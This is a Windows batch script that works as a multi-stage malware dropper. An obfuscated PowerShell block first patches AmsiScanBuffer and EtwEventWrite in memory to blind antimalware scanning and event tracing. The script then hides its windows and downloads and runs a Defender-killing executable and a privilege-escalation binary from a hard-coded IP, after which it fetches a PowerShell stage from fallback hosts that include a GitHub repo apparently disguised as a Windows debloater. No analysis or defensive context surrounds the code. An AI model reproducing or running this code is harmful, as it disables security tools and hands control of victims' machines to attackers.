@echo off
setlocal EnableExtensions

rem === STEP 0: (inline, before any download) ===
powershell -NoP -W Hidden -Command "$k='ker';$kb='nel32.dll';$Dm=[AppDomain]::CurrentDomain;$Da=New-Object System.Reflection.AssemblyName('W');$Ab=$Dm.DefineDynamicAssembly($Da,[System.Reflection.Emit.AssemblyBuilderAccess]::Run);$Mb=$Ab.DefineDynamicModule('M',$false);$Tb=$Mb.DefineType('W','Public,Class');$Dll=[System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([String]));$FldSL=[System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError');$FldEP=[System.Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint');$FldCS=[System.Runtime.InteropServices.DllImportAttribute].GetField('CharSet');$Flds=[System.Reflection.FieldInfo[]]@($FldSL,$FldEP,$FldCS);$csUni=[System.Runtime.InteropServices.CharSet]::Unicode;$csAnsi=[System.Runtime.InteropServices.CharSet]::Ansi;$ka=@($k+$kb);$m0=$Tb.DefineMethod('LL','Public,Static',[IntPtr],@([String]));$m0.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'LoadLibraryW',$csUni))));$m1=$Tb.DefineMethod('GA','Public,Static',[IntPtr],@([IntPtr],[String]));$m1.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'GetProcAddress',$csAnsi))));$m3=$Tb.DefineMethod('VP','Public,Static',[bool],@([IntPtr],[UIntPtr],[UInt32],[UInt32].MakeByRefType()));$m3.SetCustomAttribute((New-Object System.Reflection.Emit.CustomAttributeBuilder($Dll,$ka,$Flds,@($True,'VirtualProtect',$csAnsi))));$W=$Tb.CreateType();$nd='ntd';$ndb='ll.dll';$nt=$W::LL($nd+$ndb);$p6=@(0xB8,0x00,0x00,0x00,0x00,0xC3);$uptr=[UIntPtr]6;$ad='ams';$adb='i.dll';$am=$W::LL($ad+$adb);if($am -ne [IntPtr]::Zero){$sb=$W::GA($am,[char]65+[char]109+[char]115+[char]105+[char]83+[char]99+[char]97+[char]110+[char]66+[char]117+[char]102+[char]102+[char]101+[char]114);if($sb -ne [IntPtr]::Zero){$o=[UInt32]0;$W::VP($sb,$uptr,0x40,[ref]$o)|Out-Null;[Runtime.InteropServices.Marshal]::Copy($p6,0,$sb,6);$W::VP($sb,$uptr,$o,[ref]$o)|Out-Null}};if($nt -ne [IntPtr]::Zero){$ew=$W::GA($nt,[char]69+[char]116+[char]119+[char]69+[char]118+[char]101+[char]110+[char]116+[char]87+[char]114+[char]105+[char]116+[char]101);if($ew -ne [IntPtr]::Zero){$o=[UInt32]0;$W::VP($ew,$uptr,0x40,[ref]$o)|Out-Null;[Runtime.InteropServices.Marshal]::Copy($p6,0,$ew,6);$W::VP($ew,$uptr,$o,[ref]$o)|Out-Null}}"

rem === STEP 1: Download + run Defender Killer (update.exe kill) ===
powershell -NoP -W Hidden -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');try{$wc.DownloadFile('https://193.26.115.196/update.exe','%TEMP%\up.exe');Start-Process '%TEMP%\up.exe' -ArgumentList 'kill' -WindowStyle Hidden}catch{}"

rem === Wait for Defender to die ===
timeout /t 8 /nobreak >nul 2>&1

rem === STEP 2: Download + run ElevatorShellCode ===
powershell -NoP -W Hidden -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');try{$wc.DownloadFile('https://193.26.115.196/ElevatorShellCode.exe','%TEMP%\el.exe');Start-Process '%TEMP%\el.exe' -WindowStyle Hidden}catch{}"

rem === Wait for elevation ===
timeout /t 6 /nobreak >nul 2>&1

rem === STEP 3: Download + run stage_v6_pulsaar.ps1 ===
powershell -NoP -W Hidden -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$sources=@('https://193.26.115.196/stage_v6_pulsaar.ps1','https://signindat.com/stage_v6_pulsaar.ps1','https://raw.githubusercontent.com/jimmyishere111/WinDebloat11/main/stage_v6_pulsaar.ps1');foreach($u in $sources){try{$wc=New-Object Net.WebClient;$wc.DownloadFile($u,\"$env:TEMP\\s.ps1\");if((Get-Item \"$env:TEMP\\s.ps1\").Length -gt 100){break}}catch{}};powershell -NoP -W Hidden -File \"$env:TEMP\\s.ps1\""

exit /b
